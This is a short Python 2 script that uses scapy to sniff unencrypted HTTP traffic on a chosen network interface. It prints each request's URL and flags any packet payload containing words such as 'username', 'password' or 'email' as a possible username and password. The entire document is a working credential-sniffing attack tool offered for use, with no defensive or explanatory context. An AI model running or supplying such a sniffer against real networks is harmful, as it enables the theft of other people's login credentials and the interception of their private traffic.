#!/usr/bin/env python
import scapy.all as scapy
from scapy_http import http
import os
import sys
interface = raw_input("[+] Enter your interface to sniff for id and password >>> ")
def sniff(interface):
	# can be used on to filter packets :-  scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets, filter="port 80")
	print("[-] Sniffing has started it can take a while .......")
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets, filter="port 80")

def get_url(packet):
	return packet[http.HTTPRequest].Host +packet[http.HTTPRequest].Path


def get_login_info(packet):
	load = packet[scapy.Raw].load
	keywords = ["username","user","login","password","pass","email"]
	for word in keywords:
		if word in load:
			return load

def process_sniffed_packets(packet):
	print("[-] Processing Request")
	if packet.haslayer(http.HTTPRequest):
		print("[-] Processing Request")
		if packet.haslayer(scapy.Raw):
			#print(packet.show())# show shows all fields in packet
			url = get_url(packet)
			print('[+] HTTP Request >> '+url)
			login_info = get_login_info(packet)
			if login_info:
				print("\n\n[+] Possible username/password "+ login_info + "\n\n")
				exit = str(raw_input("[-] Do you want to exit y/n >>> "))
				if exit == 'y':
					print("[+] Exiting ...... Bye")
					os._exit(1)
sniff(interface)